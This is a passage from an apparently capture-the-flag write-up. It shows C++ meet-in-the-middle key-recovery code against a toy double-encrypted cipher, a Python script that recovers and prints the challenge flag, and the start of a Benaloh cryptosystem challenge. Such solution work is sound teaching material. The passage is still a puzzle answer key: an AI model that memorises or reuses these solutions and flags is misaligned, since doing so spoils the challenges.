style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">15</span>}, {<span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">7</span>}};
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> PBox[] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">3</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">4</span>};
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> PInvBox[] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">21</span>, <span style="color:#ae81ff">9</span>, <span style="color:#ae81ff">17</span>, <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">23</span>, <span style="color:#ae81ff">5</span>, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">14</span>, <span style="color:#ae81ff">15</span>, <span style="color:#ae81ff">19</span>, <span style="color:#ae81ff">13</span>, <span style="color:#ae81ff">22</span>, <span style="color:#ae81ff">16</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">20</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">18</span>, <span style="color:#ae81ff">11</span>, <span style="color:#ae81ff">10</span>, <span style="color:#ae81ff">8</span>, <span style="color:#ae81ff">12</span>, <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">6</span>, <span style="color:#ae81ff">3</span>};

unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>  middle_data;

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">S</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> SBoxes[<span style="color:#ae81ff">6</span>][<span style="color:#ae81ff">16</span>]){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> output <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">6</span>; i<span style="color:#f92672">++</span>){
        output <span style="color:#f92672">|=</span> SBoxes[i][(block <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> i) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0b1111</span>] <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> i;
    }
    <span style="color:#66d9ef">return</span> output;
}
    
<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">permute</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> pbox[]){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> output <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> bit <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">24</span>; i<span style="color:#f92672">++</span>){
        bit <span style="color:#f92672">=</span> (block <span style="color:#f92672">&gt;&gt;</span> pbox[i]) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>;
        output <span style="color:#f92672">|=</span> (bit <span style="color:#f92672">&lt;&lt;</span> i);
    }
    <span style="color:#66d9ef">return</span> output;
}

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">encrypt_data</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> res <span style="color:#f92672">=</span> block;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; i<span style="color:#f92672">++</span>){
        res <span style="color:#f92672">^=</span> key;
        res <span style="color:#f92672">=</span> S(res, SBoxes);
        res <span style="color:#f92672">=</span> permute(res,PBox);
    }
    res <span style="color:#f92672">^=</span> key;
    <span style="color:#66d9ef">return</span> res;
}

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">decrypt_data</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> res <span style="color:#f92672">=</span> block;
    res <span style="color:#f92672">^=</span> key;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>; i<span style="color:#f92672">++</span>){
        res <span style="color:#f92672">=</span> permute(res, PInvBox);
        res <span style="color:#f92672">=</span> S(res, SInvBoxes);
        res <span style="color:#f92672">^=</span> key;
    }
    <span style="color:#66d9ef">return</span> res;
}

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">encrypt</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key2){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> res <span style="color:#f92672">=</span> block;
    res <span style="color:#f92672">=</span> encrypt_data(res, key1);
    res <span style="color:#f92672">=</span> encrypt_data(res, key2);
    <span style="color:#66d9ef">return</span> res;
}

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">decrypt</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> block, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key1, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key2){
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> res <span style="color:#f92672">=</span> block;
    res <span style="color:#f92672">=</span> decrypt_data(res, key2);
    res <span style="color:#f92672">=</span> decrypt_data(res, key1);
    <span style="color:#66d9ef">return</span> res;
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init_middle_data</span>(){
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Init middle data&#34;</span> <span style="color:#f92672">&lt;&lt;</span> endl;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> enc <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1000000</span>; i<span style="color:#f92672">++</span>){
        enc <span style="color:#f92672">=</span> encrypt_data(<span style="color:#ae81ff">0</span>,i);
        <span style="color:#66d9ef">if</span>(middle_data.find(enc) <span style="color:#f92672">==</span> middle_data.end()){
            middle_data.insert(pair<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(enc,i));
        }
        <span style="color:#66d9ef">else</span>{
            <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
            <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> tmp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
            <span style="color:#66d9ef">do</span>{
                count<span style="color:#f92672">++</span>;
                tmp <span style="color:#f92672">=</span> count <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> enc;
            }<span style="color:#66d9ef">while</span>(middle_data.find(tmp) <span style="color:#f92672">!=</span> middle_data.end());
            middle_data.insert(pair<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(tmp,i));
        }
    }
}

unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> find_possible_key(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> t){
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Find possible keys for &#34;</span> <span style="color:#f92672">&lt;&lt;</span> t <span style="color:#f92672">&lt;&lt;</span> endl;
    unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> result;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> dec <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x1000000</span>; i<span style="color:#f92672">++</span>){
        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> dec_count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
        dec <span style="color:#f92672">=</span> decrypt_data(t,i);
        <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> dec_tmp <span style="color:#f92672">=</span> dec;
        <span style="color:#66d9ef">while</span>(middle_data.find(dec) <span style="color:#f92672">!=</span> middle_data.end()){
            <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> key <span style="color:#f92672">=</span> i;
            <span style="color:#66d9ef">if</span>(result.find(key) <span style="color:#f92672">==</span> result.end()){
                result.insert(pair<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(key,middle_data[dec]));
            }
            <span style="color:#66d9ef">else</span>{
                <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
                <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> tmp;
                <span style="color:#66d9ef">do</span>{
                    count<span style="color:#f92672">++</span>;
                    tmp <span style="color:#f92672">=</span> count <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> key;
                }<span style="color:#66d9ef">while</span>(result.find(tmp) <span style="color:#f92672">!=</span> result.end());
                result.insert(pair<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>(tmp,middle_data[dec]));
            }
            dec_count<span style="color:#f92672">++</span>;
            dec <span style="color:#f92672">=</span> dec_count <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> dec_tmp;
        }
    }
    <span style="color:#66d9ef">return</span> result;
}

<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">recover_key_part2</span>(vector<span style="color:#f92672">&lt;</span> unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span> possible_keys,vector<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>enc_labels,<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> a0,<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> b0,<span style="color:#66d9ef">int</span> idxi,<span style="color:#66d9ef">int</span> idxj){
    unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> choice_keys;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> c, c1, b1, a00;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; i<span style="color:#f92672">++</span>){
        <span style="color:#66d9ef">if</span>(i <span style="color:#f92672">==</span> idxi <span style="color:#f92672">||</span> i <span style="color:#f92672">==</span> idxj) <span style="color:#66d9ef">continue</span>;
        choice_keys <span style="color:#f92672">=</span> possible_keys[i];
        c <span style="color:#f92672">=</span> enc_labels[i];
        c1 <span style="color:#f92672">=</span> enc_labels[idxi];
        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">auto</span> iter <span style="color:#f92672">=</span> choice_keys.begin(); iter <span style="color:#f92672">!=</span> choice_keys.end(); <span style="color:#f92672">++</span>iter){
            b1 <span style="color:#f92672">=</span> iter<span style="color:#f92672">-&gt;</span>first;
            <span style="color:#66d9ef">if</span>(b1 <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x1000000</span>) <span style="color:#66d9ef">continue</span>;
            <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> dec_b1 <span style="color:#f92672">=</span> b1;
            <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
            <span style="color:#66d9ef">while</span>(choice_keys.find(b1) <span style="color:#f92672">!=</span> choice_keys.end()){
                a00 <span style="color:#f92672">=</span> choice_keys[b1];
                <span style="color:#66d9ef">if</span>(a0 <span style="color:#f92672">==</span> a00 <span style="color:#f92672">&amp;&amp;</span> decrypt(c,a0,dec_b1) <span style="color:#f92672">==</span> decrypt(c1,a0,b0)){
                    <span style="color:#66d9ef">return</span> dec_b1;
                }
                count<span style="color:#f92672">++</span>;
                b1 <span style="color:#f92672">=</span> count <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> dec_b1;
            }
        }
    }
    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}

<span style="color:#66d9ef">bool</span> <span style="color:#a6e22e">recover_key</span>(vector<span style="color:#f92672">&lt;</span> unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span> possible_keys,vector<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>enc_labels){
    unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>  choice_keys, choice_keys2;
    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> c1, b0, a0, p1, c2, a1, b1;
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; i<span style="color:#f92672">++</span>){
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Recover key &#34;</span> <span style="color:#f92672">&lt;&lt;</span> i <span style="color:#f92672">&lt;&lt;</span> endl;
        choice_keys <span style="color:#f92672">=</span> possible_keys[i];
        c1 <span style="color:#f92672">=</span> enc_labels[i];
        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; j<span style="color:#f92672">++</span>){
            <span style="color:#66d9ef">if</span>(i <span style="color:#f92672">==</span> j) <span style="color:#66d9ef">continue</span>;
            choice_keys2 <span style="color:#f92672">=</span> possible_keys[j];
            c2 <span style="color:#f92672">=</span> enc_labels[j];
            <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">auto</span> iter <span style="color:#f92672">=</span> choice_keys.begin(); iter <span style="color:#f92672">!=</span> choice_keys.end(); <span style="color:#f92672">++</span>iter){
                b0 <span style="color:#f92672">=</span> iter<span style="color:#f92672">-&gt;</span>first;
                <span style="color:#66d9ef">if</span>(b0 <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0x1000000</span>) <span style="color:#66d9ef">continue</span>;
                <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
                <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> dec_b0 <span style="color:#f92672">=</span> b0;
                <span style="color:#66d9ef">while</span>(choice_keys.find(b0) <span style="color:#f92672">!=</span> choice_keys.end()){
                    a0 <span style="color:#f92672">=</span> choice_keys[b0];
                    p1 <span style="color:#f92672">=</span> decrypt(c1, a0, dec_b0);
                    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> b0_tmp <span style="color:#f92672">=</span> dec_b0;
                    <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> count_tmp <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
                    <span style="color:#66d9ef">while</span>(choice_keys2.find(b0_tmp) <span style="color:#f92672">!=</span> choice_keys2.end()){
                        a1 <span style="color:#f92672">=</span> choice_keys2[b0_tmp];
                        <span style="color:#66d9ef">if</span>(p1 <span style="color:#f92672">==</span> decrypt(c2,a1,dec_b0)){
                            b1 <span style="color:#f92672">=</span> recover_key_part2(possible_keys,enc_labels,a0,dec_b0,i,j);
                            <span style="color:#66d9ef">if</span>(b1 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>){
                                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;Find keys : a1 = &#34;</span> <span style="color:#f92672">&lt;&lt;</span> a1 <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;, b1 = &#34;</span> <span style="color:#f92672">&lt;&lt;</span> b1 <span style="color:#f92672">&lt;&lt;</span> endl;
                                <span style="color:#66d9ef">return</span> true;
                            }
                        }
                        count_tmp<span style="color:#f92672">++</span>;
                        b0_tmp <span style="color:#f92672">=</span> count_tmp <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> dec_b0;
                    }
                    count<span style="color:#f92672">++</span>;
                    b0 <span style="color:#f92672">=</span> count <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">|</span> dec_b0;
                }
            }
        }
    }
    <span style="color:#66d9ef">return</span> false;
}


<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> g_tables[<span style="color:#ae81ff">2</span>][<span style="color:#ae81ff">4</span>][<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> {{{<span style="color:#ae81ff">5737111L</span>, <span style="color:#ae81ff">2983937L</span>},{<span style="color:#ae81ff">15406556L</span>, <span style="color:#ae81ff">16284948L</span>},{<span style="color:#ae81ff">14172222L</span>, <span style="color:#ae81ff">14132908L</span>},{<span style="color:#ae81ff">4000971L</span>, <span style="color:#ae81ff">16383744L</span>}},{{<span style="color:#ae81ff">8204186L</span>, <span style="color:#ae81ff">1546264L</span>},{<span style="color:#ae81ff">229766L</span>, <span style="color:#ae81ff">3208405L</span>},{<span style="color:#ae81ff">9550202L</span>, <span style="color:#ae81ff">13483954L</span>},{<span style="color:#ae81ff">13257058L</span>, <span style="color:#ae81ff">5195482L</span>}}};

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(){
    init_middle_data();
    <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>; i<span style="color:#f92672">++</span>){
        vector<span style="color:#f92672">&lt;</span> unordered_map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> <span style="color:#f92672">&gt;</span> possible_keys(<span style="color:#ae81ff">4</span>);
        vector<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span>enc_labels(<span style="color:#ae81ff">4</span>);
        <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">4</span>; j<span style="color:#f92672">++</span>){
            possible_keys[j] <span style="color:#f92672">=</span> find_possible_key(g_tables[i][j][<span style="color:#ae81ff">1</span>]);
            enc_labels[j] <span style="color:#f92672">=</span> g_tables[i][j][<span style="color:#ae81ff">0</span>];
        }
        recover_key(possible_keys,enc_labels);
    }

}
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># exp.py</span>
<span style="color:#f92672">import</span> hashlib

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(A, B):
    <span style="color:#66d9ef">return</span> bytes(a <span style="color:#f92672">^</span> b <span style="color:#66d9ef">for</span> a, b <span style="color:#f92672">in</span> zip(A, B))

inputs <span style="color:#f92672">=</span> {
    <span style="color:#ae81ff">1</span>: <span style="color:#ae81ff">11693387</span>,
    <span style="color:#ae81ff">2</span>: <span style="color:#ae81ff">11338704</span>,
    <span style="color:#ae81ff">3</span>: <span style="color:#ae81ff">7371799</span>,
    <span style="color:#ae81ff">4</span>: <span style="color:#ae81ff">2815776</span>
}
msg <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;{}:{}:{}:{}&#34;</span><span style="color:#f92672">.</span>format(inputs[<span style="color:#ae81ff">1</span>], inputs[<span style="color:#ae81ff">2</span>], inputs[<span style="color:#ae81ff">3</span>], inputs[<span style="color:#ae81ff">4</span>])
msg <span style="color:#f92672">=</span> msg<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;ascii&#39;</span>)

m <span style="color:#f92672">=</span> hashlib<span style="color:#f92672">.</span>sha512()
m<span style="color:#f92672">.</span>update(msg)
m<span style="color:#f92672">.</span>digest()

xor_flag <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">),u</span><span style="color:#ae81ff">\x1b\x1d</span><span style="color:#e6db74">E:</span><span style="color:#ae81ff">\xa8</span><span style="color:#e6db74">q</span><span style="color:#ae81ff">\x91</span><span style="color:#e6db74">}&amp;</span><span style="color:#ae81ff">\xc7\x90\xbb\xce</span><span style="color:#e6db74">]</span><span style="color:#ae81ff">\xf5\x17\x89\xd7\xfa\x07\x86\x83\xfa\x9b</span><span style="color:#e6db74">^</span><span style="color:#ae81ff">\xcb\xd7</span><span style="color:#e6db74">7</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">W</span><span style="color:#ae81ff">\xca\xce</span><span style="color:#e6db74">XD7&#39;</span>

flag <span style="color:#f92672">=</span> xor(m<span style="color:#f92672">.</span>digest(),xor_flag)
<span style="color:#66d9ef">print</span>(flag)
<span style="color:#75715e"># dice{N0w_YoUr3_Th1nkIn6_Wi7H_pR0t0c015}</span>
</code></pre></div><h3 id="benalohrecurrence">benaloh(Recurrence)</h3>
<h4 id="analysis-3">Analysis</h4>
<p>This is a <a href="https://en.wikipedia.org/wiki/Benaloh_cryptosystem">Benaloh cryptosystem</a> challenge, the code is short:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># benaloh</span>
<span style="color:#f92672">from</span> Crypto.Random.random <span style="color:#f92672">import</span> randrange
<span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> getPrime, GCD

r <span style="color:#f92672">=</span> <span style="color:#ae81ff">17</span>

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">keygen</span>():
	<span style="color:#66d9ef">while</span> True:
		p <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">1024</span>)
		a, b <span style="color:#f92672">=</span> divmod(p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, r)
		<span style="color:#66d9ef">if</span> b <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> GCD(r, a) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
			<span style="color:#66d9ef">break</span>
	<span style="color:#66d9ef">while</span> True:
		q <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">1024</span>)
		<span style="color:#66d9ef">if</span> GCD(r, q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
			<span style="color:#66d9ef">break</span>
	n <span style="color:#f92672">=</span> p<span style="color:#f92672">*</span>q
	phi <span style="color:#f92672">=</span> (p<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">*</span>(q<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>)<span style="color:#f92672">//</span>r
	y <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
	<span style="color:#66d9ef">while</span> True:
		y <span style="color:#f92672">=</span> randrange(n)
		x <span style="color:#f92672">=</span> pow(y, phi, n)
		<span style="color:#66d9ef">if</span> x <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
			<span style="color:#66d9ef">break</span>
	log <span style="color:#f92672">=</span> {pow(x, i, n): i <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(r)}
	<span style="color:#66d9ef">return</span> (n, y), (n, phi, log)

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">encrypt</span>(data, pk):
	n, y <span style="color:#f92672">=</span> pk
	u <span style="color:#f92672">=</span> randrange(n)
	a <span style="color:#f92672">=</span> randrange(n)
	c <span style="color:#f92672">=</span> randrange(n)
	<span style="color:#66d9ef">for</span> m <span style="color:#f92672">in</span> data<span style="color:#f92672">.</span>hex():
		<span style="color:#66d9ef">yield</span> pow(y, int(m, <span style="color:#ae81ff">16</span>), n) <span style="color:#f92672">*</span> pow(u, r, n) <span style="color:#f92672">%</span> n
		u <span style="color:#f92672">=</span> (a<span style="color:#f92672">*</span>u <span style="color:#f92672">+</span> c) <span style="color:#f92672">%</span> n

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">decrypt</span>(data, sk):
	n, phi, log <span style="color:#f92672">=</span> sk
